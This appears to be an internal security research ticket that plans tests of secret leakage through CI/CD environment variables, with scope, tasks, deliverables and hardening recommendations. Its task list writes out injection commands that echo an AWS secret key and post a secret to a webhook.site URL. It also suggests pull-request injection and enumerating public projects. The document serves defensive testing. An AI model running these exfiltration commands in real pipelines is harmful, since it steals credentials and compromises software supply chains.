# 🔐 Research Spike: Test for Secret Theft via CI Variables

**Goal:**  
Abuse CI/CD job environment variables to leak secrets (e.g., `$AWS_SECRET_ACCESS_KEY`, API tokens, internal credentials) by injecting malicious commands in build steps or pull requests.

**Why It Matters:**  
Secrets stored in CI/CD environments are often exposed to too many users or pipelines. Misconfigurations can allow an attacker or malicious insider to exfiltrate credentials using common build tools, compromising the software supply chain.

---

### 🔍 Scope
- CI/CD platforms (GitHub Actions, GitLab CI, Jenkins, CircleCI, etc.)
- Build jobs and runners with access to sensitive environment variables
- Build logs, artifact storage, and injected runtime environments

---

### ✅ Tasks
- [ ] Identify jobs or repos with access to sensitive secrets (AWS keys, tokens)
- [ ] Inject malicious print or exfil commands:
  - `echo $AWS_SECRET_ACCESS_KEY`
  - `curl -X POST https://webhook.site/<id> -d $SECRET`
- [ ] Check logs and artifacts for exposure
- [ ] Evaluate permissions on who can trigger jobs or edit pipeline configs
- [ ] Optional:
  - Use PR injection (GitHub Actions) or merge-triggered job changes
  - Enumerate public projects that use secrets in workflows

---

### 🎯 Deliverables
- Table of jobs and exposed secrets via ENV
- Screenshot or redacted logs of successful secret leaks
- Recommendations:
  - Restrict access to protected variables
  - Mask secrets in logs
  - Use short-lived credentials (OIDC, vault-injected tokens)
  - Enforce CI linting or signed workflows

---

### 📚 Reference Materials
- GitHub Actions Secrets: https://docs.github.com/en/actions/security-guides/encrypted-secrets  
- GitLab CI Variables: https://docs.gitlab.com/ee/ci/variables/  
- CI/CD secrets best practices: https://blog.gitguardian.com/  
- Webhook testing: https://webhook.site/  
- Insecure defaults: https://blog.aquasec.com/ci-cd-pipeline-security-risks

---

### 🏷️ Tags / Labels
`ci-cd` `secrets` `env-vars` `supply-chain` `injection` `github-actions` `gitlab` `jenkins`

---

### 📈 Effort Level
**Medium (M)** — low-code injection effort, but success depends on pipeline visibility and environment isolation.

---

### ✅ Acceptance Criteria
- [ ] At least 3 CI pipelines tested across different environments
- [ ] One example of successful ENV variable exposure documented
- [ ] Redacted evidence and hardening steps shared in internal wiki/report
